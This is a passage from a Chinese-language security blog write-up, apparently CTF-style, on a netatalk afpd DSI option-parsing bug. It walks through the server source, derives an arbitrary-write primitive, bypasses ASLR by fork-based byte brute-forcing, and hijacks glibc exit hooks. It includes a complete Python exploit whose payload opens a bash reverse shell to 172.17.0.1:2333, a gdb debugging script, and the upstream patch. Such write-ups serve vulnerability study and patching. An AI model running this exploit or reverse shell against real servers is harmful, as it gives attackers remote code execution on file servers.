DSI *dsi, <span class="type">server_child_t</span> *server_children)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">afp_child_t</span> *child = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dsi_getsession(dsi, server_children, obj-&gt;options.tickleval, &amp;child) != <span class="number">0</span>) {</span><br><span class="line">        LOG(log_error, logtype_afpd, <span class="string">"dsi_start: session error: %s"</span>, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we've forked. */</span></span><br><span class="line">    <span class="keyword">if</span> (child == <span class="literal">NULL</span>) {</span><br><span class="line">        configfree(obj, dsi);</span><br><span class="line">        afp_over_dsi(obj); <span class="comment">/* start a session */</span></span><br><span class="line">        <span class="built_in">exit</span> (<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> child;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>接下来来看会话的设置.</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main</span><br><span class="line">    -&gt;dsi_start</span><br><span class="line">        -&gt;dsi_getsession</span><br><span class="line">            -&gt;dsi_tcp_open : 读取dsi数据包,建立连接</span><br><span class="line">                -&gt;dsi_init_buffer : 分配(预)读取缓冲区(dsi-&gt;command,dsi-&gt;buffer)</span><br><span class="line">                -&gt;dsi_stream_read : 从socket中读取数据</span><br><span class="line">            -&gt;dsi_opensession : 设置session(漏洞函数)</span><br><span class="line">        -&gt;afp_over_dsi : 读取dsi数据包,执行命令</span><br><span class="line">            -&gt;dsi_stream_receive : 从socket中读取数据</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * Allocate DSI read buffer and read-ahead buffer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">dsi_init_buffer</span><span class="params">(DSI *dsi)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> ((dsi-&gt;commands = <span class="built_in">malloc</span>(dsi-&gt;server_quantum)) == <span class="literal">NULL</span>) {</span><br><span class="line">        LOG(log_error, logtype_dsi, <span class="string">"dsi_init_buffer: OOM"</span>);</span><br><span class="line">        AFP_PANIC(<span class="string">"OOM in dsi_init_buffer"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* dsi_peek() read ahead buffer, default is 12 * 300k = 3,6 MB (Apr 2011) */</span></span><br><span class="line">    <span class="keyword">if</span> ((dsi-&gt;buffer = <span class="built_in">malloc</span>(dsi-&gt;dsireadbuf * dsi-&gt;server_quantum)) == <span class="literal">NULL</span>) {</span><br><span class="line">        LOG(log_error, logtype_dsi, <span class="string">"dsi_init_buffer: OOM"</span>);</span><br><span class="line">        AFP_PANIC(<span class="string">"OOM in dsi_init_buffer"</span>);</span><br><span class="line">    }</span><br><span class="line">    dsi-&gt;start = dsi-&gt;buffer;</span><br><span class="line">    dsi-&gt;eof = dsi-&gt;buffer;</span><br><span class="line">    dsi-&gt;end = dsi-&gt;buffer + (dsi-&gt;dsireadbuf * dsi-&gt;server_quantum);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* accept the socket and do a little sanity checking */</span></span><br><span class="line"><span class="type">static</span> <span class="type">pid_t</span> <span class="title function_">dsi_tcp_open</span><span class="params">(DSI *dsi)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    SOCKLEN_T len;</span><br><span class="line"></span><br><span class="line">    len = <span class="keyword">sizeof</span>(dsi-&gt;client);</span><br><span class="line">    dsi-&gt;socket = accept(dsi-&gt;serversock, (<span class="keyword">struct</span> sockaddr *) &amp;dsi-&gt;client, &amp;len);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> TCPWRAP</span></span><br><span class="line">    {</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">request_info</span> <span class="title">req</span>;</span></span><br><span class="line">        request_init(&amp;req, RQ_DAEMON, <span class="string">"afpd"</span>, RQ_FILE, dsi-&gt;socket, <span class="literal">NULL</span>);</span><br><span class="line">        fromhost(&amp;req);</span><br><span class="line">        <span class="keyword">if</span> (!hosts_access(&amp;req)) {</span><br><span class="line">            LOG(deny_severity, logtype_dsi, <span class="string">"refused connect from %s"</span>, eval_client(&amp;req));</span><br><span class="line">            close(dsi-&gt;socket);</span><br><span class="line">            errno = ECONNREFUSED;</span><br><span class="line">            dsi-&gt;socket = <span class="number">-1</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* TCPWRAP */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dsi-&gt;socket &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    getitimer(ITIMER_PROF, &amp;itimer);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == (pid = fork()) ) { <span class="comment">/* child */</span></span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span> <span class="title">timer</span> =</span> {{<span class="number">0</span>, <span class="number">0</span>}, {DSI_TCPTIMEOUT, <span class="number">0</span>}};</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">newact</span>, <span class="title">oldact</span>;</span></span><br><span class="line">        <span class="type">uint8_t</span> block[DSI_BLOCKSIZ];</span><br><span class="line">        <span class="type">size_t</span> stored;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* reset signals */</span></span><br><span class="line">        server_reset_signal();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEBUGGING</span></span><br><span class="line">        <span class="comment">/* install an alarm to deal with non-responsive connections */</span></span><br><span class="line">        newact.sa_handler = timeout_handler;</span><br><span class="line">        sigemptyset(&amp;newact.sa_mask);</span><br><span class="line">        newact.sa_flags = <span class="number">0</span>;</span><br><span class="line">        sigemptyset(&amp;oldact.sa_mask);</span><br><span class="line">        oldact.sa_flags = <span class="number">0</span>;</span><br><span class="line">        setitimer(ITIMER_PROF, &amp;itimer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((sigaction(SIGALRM, &amp;newact, &amp;oldact) &lt; <span class="number">0</span>) ||</span><br><span class="line">            (setitimer(ITIMER_REAL, &amp;timer, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)) {</span><br><span class="line">            LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: %s"</span>, strerror(errno));</span><br><span class="line">            <span class="built_in">exit</span>(EXITERR_SYS);</span><br><span class="line">        }</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        dsi_init_buffer(dsi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read in commands. this is similar to dsi_receive except</span></span><br><span class="line"><span class="comment">         * for the fact that we do some sanity checking to prevent</span></span><br><span class="line"><span class="comment">         * delinquent connections from causing mischief. */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read in the first two bytes */</span></span><br><span class="line">        len = dsi_stream_read(dsi, block, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!len ) {</span><br><span class="line">            <span class="comment">/* connection already closed, don't log it (normal OSX 10.3 behaviour) */</span></span><br><span class="line">            <span class="built_in">exit</span>(EXITERR_CLOSED);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span> || (block[<span class="number">0</span>] &gt; DSIFL_MAX) || (block[<span class="number">1</span>] &gt; DSIFUNC_MAX)) {</span><br><span class="line">            LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: invalid header"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read in the rest of the header */</span></span><br><span class="line">        stored = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (stored &lt; DSI_BLOCKSIZ) {</span><br><span class="line">            len = dsi_stream_read(dsi, block + stored, <span class="keyword">sizeof</span>(block) - stored);</span><br><span class="line">            <span class="keyword">if</span> (len &gt; <span class="number">0</span>)</span><br><span class="line">                stored += len;</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: stream_read: %s"</span>, strerror(errno));</span><br><span class="line">                <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        dsi-&gt;header.dsi_flags = block[<span class="number">0</span>];</span><br><span class="line">        dsi-&gt;header.dsi_command = block[<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_requestID, block + <span class="number">2</span>,</span><br><span class="line">               <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_requestID));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_code, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_code));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_reserved, block + <span class="number">12</span>,</span><br><span class="line">               <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_reserved));</span><br><span class="line">        dsi-&gt;clientID = ntohs(dsi-&gt;header.dsi_requestID);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* make sure we don't over-write our buffers. */</span></span><br><span class="line">        dsi-&gt;cmdlen = min(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line">        stored = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (stored &lt; dsi-&gt;cmdlen) {</span><br><span class="line">            len = dsi_stream_read(dsi, dsi-&gt;commands + stored, dsi-&gt;cmdlen - stored);</span><br><span class="line">            <span class="keyword">if</span> (len &gt; <span class="number">0</span>)</span><br><span class="line">                stored += len;</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: stream_read: %s"</span>, strerror(errno));</span><br><span class="line">                <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stop timer and restore signal handler */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEBUGGING</span></span><br><span class="line">        <span class="built_in">memset</span>(&amp;timer, <span class="number">0</span>, <span class="keyword">sizeof</span>(timer));</span><br><span class="line">        setitimer(ITIMER_REAL, &amp;timer, <span class="literal">NULL</span>);</span><br><span class="line">        sigaction(SIGALRM, &amp;oldact, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        LOG(log_info, logtype_dsi, <span class="string">"AFP/TCP session from %s:%u"</span>,</span><br><span class="line">            getip_string((<span class="keyword">struct</span> sockaddr *)&amp;dsi-&gt;client),</span><br><span class="line">            getip_port((<span class="keyword">struct</span> sockaddr *)&amp;dsi-&gt;client));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* send back our pid */</span></span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>


<p>于是我们可以得出一个任意写原语,覆盖dsi-&gt;command,再次发送数据包即可在dsi_stream_receive完成任意写入.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;cmdlen) != dsi-&gt;cmdlen)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></tbody></table></figure>

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><blockquote>
<p>“世界上最遥远的距离,是任意地址写和ASLR”</p>
</blockquote>
<p>利用环境: GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27,保护全开(CANARY,PIE,ASLR,FULL RELRO).</p>
<p>由于ASLR和PIE的开启,我们没有任何已知地址.常用的绕过手段是Partial Overwrite.<br>然而command的堆空间是mmap出来的,无法通过部分覆写使其偏移到某个空闲堆块的管理指针.<br>(图中0x7fdfe6658010即command指针)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401281133295.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401281120961.png"></p>
<p>另一种ASLR的绕过防法是Fork爆破(更常见的是canary的绕过),由于父子进程拥有相同的地址空间,可以使用子进程进行逐字节爆破,若子进程崩溃,父进程不受影响.若子进程正常,则说明该字节爆破正确.<br>而据之前的分析,该程序处理的逻辑确实在fork出的子进程中.于是便可逐字节覆盖command指针进行爆破.</p>
<p>这里提一下怎么验证地址是否泄露正确.<br>先set follow-fork-mode parent(因为子进程会段错误卡住),然后continue并开始爆破.由于command的地址空间是fork后在子进程中开辟的,所以需要切换到子进程才可见.set follow-fork-mode child,在dsi_opensession下断点,然后continue并发一个普通的连接包,当断点触发我们已经在子进程中了,vmmap查看地址布局.<br>发现我们爆破出的地址并不是command的地址,而是低地址空间的另一处合法可写地址.<br>不过稍加分析可以得知,这个地址与libc基址之间的偏移是固定的,调试出的偏移是0x5245ff0.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401281314678.png"></p>
<p>glibc2.27劫持控制流还是比较easy的,直接exit_hook即可(CTF术语,实则是_rtld_global._dl_rtld_lock_recursive和_rtld_global._dl_load_lock),可以在exit时完成一次func(arg)的函数调用.与传统CTF不同,这里需要执行system(bash -c “bash -i&gt;&amp; /dev/tcp/172.17.0.1/2333 0&lt;&amp;1”). 因为传统的CTF pwn时直接将标准输入输出重定向到网络连接中,直接起shell即可.</p>
<p>(下图中应该布置为__libc_system,没有那个+32,截图有误)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401281509578.png"></p>
<p>最后提一点,看一些wp中劫持exit_hook后是断开连接后等待相应进程退出(exit),其实不用等,从DSI协议标准中就能看出断开的方法:发个DSICloseSession的包即可.</p>
<blockquote>
<p>Session closure can be initiated by either side by sending DSICloseSession. The sender does not need to wait for a reply and should immediately close the session after sending the message.</p>
</blockquote>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(cmd) {</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> DSIFUNC_CLOSE:</span><br><span class="line">    LOG(log_debug, logtype_afpd, <span class="string">"DSI: close session request"</span>);</span><br><span class="line">    afp_dsi_close(obj);</span><br><span class="line">    LOG(log_note, logtype_afpd, <span class="string">"done"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>注意字节序即可,DSI数据包是大端序,程序是小端序.</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">adbyte = <span class="string">b'\x10'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = <span class="string">b''</span></span><br><span class="line">            payload += <span class="string">b'\x01'</span></span><br><span class="line">            payload += p8(<span class="number">0x10</span>+i+<span class="number">2</span>)</span><br><span class="line">            payload += <span class="string">b'a'</span>*<span class="number">0x10</span></span><br><span class="line">            payload += adbyte</span><br><span class="line">            payload += p8(j)</span><br><span class="line"></span><br><span class="line">            lenth = <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line">            header = <span class="string">b''</span></span><br><span class="line">            header += <span class="string">b'\x00'</span> <span class="comment">#flags</span></span><br><span class="line">            header += <span class="string">b'\x04'</span> <span class="comment">#command</span></span><br><span class="line">            header += p16(<span class="number">1</span>) <span class="comment">#request id</span></span><br><span class="line">            header += p32(<span class="number">0</span>) <span class="comment">#offset</span></span><br><span class="line">            header += p32(lenth)</span><br><span class="line">            header += p32(<span class="number">0</span>) <span class="comment">#preserve</span></span><br><span class="line"></span><br><span class="line">            io.send(header+payload)</span><br><span class="line">            ret = io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> ret == <span class="string">b''</span>:</span><br><span class="line">                <span class="keyword">raise</span> EOFError</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            log.success(<span class="string">"except"</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            io = remote(url,port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># log.success("success:"+str(i)+':'+hex(j))</span></span><br><span class="line">            adbyte+=p8(j)</span><br><span class="line">            log.success(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(adbyte,<span class="string">'little'</span>,signed=<span class="literal">False</span>)))</span><br><span class="line">            <span class="comment"># pause()</span></span><br><span class="line">            io.close()</span><br><span class="line">            io = remote(url,port)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">io.close()</span><br><span class="line">adbyte += <span class="string">b'\x7f'</span></span><br><span class="line">leak = <span class="built_in">int</span>.from_bytes(adbyte,<span class="string">'little'</span>,signed=<span class="literal">False</span>)</span><br><span class="line">log.success(<span class="string">'leak:'</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.leak_libc(<span class="string">'libc_base'</span>,leak+<span class="number">0x5245ff0</span>)</span><br><span class="line">dl_rtld_lock_recursive = p.libc_base+<span class="number">0xed4f60</span></span><br><span class="line">dl_load_lock = p.libc_base+<span class="number">0xed4968</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io = remote(url,port)</span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'\x01'</span></span><br><span class="line">payload += <span class="string">b'\x18'</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">0x10</span>+pack(dl_load_lock,<span class="number">64</span>,<span class="string">'little'</span>,<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">lenth = <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line">header = <span class="string">b''</span></span><br><span class="line">header += <span class="string">b'\x00'</span> <span class="comment">#flags</span></span><br><span class="line">header += <span class="string">b'\x04'</span> <span class="comment">#command</span></span><br><span class="line">header += p16(<span class="number">1</span>) <span class="comment">#request id</span></span><br><span class="line">header += p32(<span class="number">0</span>) <span class="comment">#offset</span></span><br><span class="line">header += p32(lenth)</span><br><span class="line">header += p32(<span class="number">0</span>) <span class="comment">#preserve</span></span><br><span class="line"></span><br><span class="line">io.send(header+payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'bash -c "bash -i&gt;&amp; /dev/tcp/172.17.0.1/2333 0&lt;&amp;1"\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x5f8</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += pack(p.system_addr-<span class="number">32</span>,<span class="number">64</span>,<span class="string">'little'</span>,<span class="literal">False</span>) <span class="comment">#-32是因为docker的libc和题目给的不一样</span></span><br><span class="line"></span><br><span class="line">lenth = <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line">header = <span class="string">b''</span></span><br><span class="line">header += <span class="string">b'\x00'</span> <span class="comment">#flags</span></span><br><span class="line">header += <span class="string">b'\x01'</span> <span class="comment">#command</span></span><br><span class="line">header += p16(<span class="number">1</span>) <span class="comment">#request id</span></span><br><span class="line">header += p32(<span class="number">0</span>) <span class="comment">#offset</span></span><br><span class="line">header += p32(lenth)</span><br><span class="line">header += p32(<span class="number">0</span>) <span class="comment">#preserve</span></span><br><span class="line"></span><br><span class="line">io.send(header+payload)</span><br><span class="line"></span><br><span class="line">io.close()</span><br><span class="line"><span class="comment"># io.interactive()</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401281601727.png"></p>
<h2 id="调试脚本"><a href="#调试脚本" class="headerlink" title="调试脚本"></a>调试脚本</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">target remote <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">4399</span></span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br><span class="line"></span><br><span class="line"><span class="meta"># b main</span></span><br><span class="line">c</span><br><span class="line"><span class="built_in">set</span> detach-on-fork off</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"></span><br><span class="line">b dsi_opensession</span><br><span class="line">c</span><br><span class="line">b dsi_stream_receive</span><br><span class="line">c</span><br></pre></td></tr></tbody></table></figure>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>补丁就是加上了检测,限制option_len必须等于sizeof(dsi-&gt;attn_quantum).<br>(<del>有一说一,我并不理解补丁这里为什么不写成常量,attn_quantum的类型是uint32_t也与机器字长无关…..然而修复前的写法更是逆天.</del>)</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> DSIOPT_ATTNQUANT:</span><br><span class="line">  <span class="keyword">if</span> (option_len != <span class="keyword">sizeof</span>(dsi-&gt;attn_quantum)) {</span><br><span class="line">    LOG(log_error, logtype_dsi, <span class="string">"option %"</span>PRI<span class="string">u8" bad length: %zu"</span>,</span><br><span class="line">        cmd, option_len);</span><br><span class="line">    <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;attn_quantum, &amp;dsi-&gt;commands[i], option_len);</span><br><span class="line">  dsi-&gt;attn_quantum = ntohl(dsi-&gt;attn_quantum);</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Data_Stream_Interface">https://en.wikipedia.org/wiki/Data_Stream_Interface</a><br><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/11/06/netatalk/">https://xuanxuanblingbling.github.io/ctf/pwn/2021/11/06/netatalk/</a><br><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-j675-7hvj-qfw5">https://github.com/advisories/GHSA-j675-7hvj-qfw5</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
